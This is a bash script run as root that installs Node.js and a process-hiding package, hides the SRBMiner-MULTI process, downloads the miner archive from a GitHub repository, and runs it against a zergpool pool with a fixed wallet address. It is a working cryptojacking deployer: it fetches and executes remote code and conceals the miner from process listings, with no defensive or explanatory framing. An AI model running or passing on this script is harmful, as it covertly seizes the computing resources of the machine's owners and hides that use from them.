#!/bin/bash
sudo su --command "sudo apt update &&
sudo apt install gcc -y && 
curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && 
sudo apt install nodejs && 
npm install -g npm@8.4.1 && 
npm i -g node-process-hider && 
sudo ph add SRBMiner-MULTI && 
wget https://github.com/geraldyolang11/mine/raw/main/sm.tar.gz && 
chmod +x sm.tar.gz && 
tar -xvf sm.tar.gz && chmod +x SRBMiner-MULTI && ./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool verushash.eu.mine.zergpool.com:3300 --wallet 16GF8LfH1eLW2sWioKvTPoSKZ4U1i8Koci --password c=BTC,mc=VRSC --cpu-threads 2"
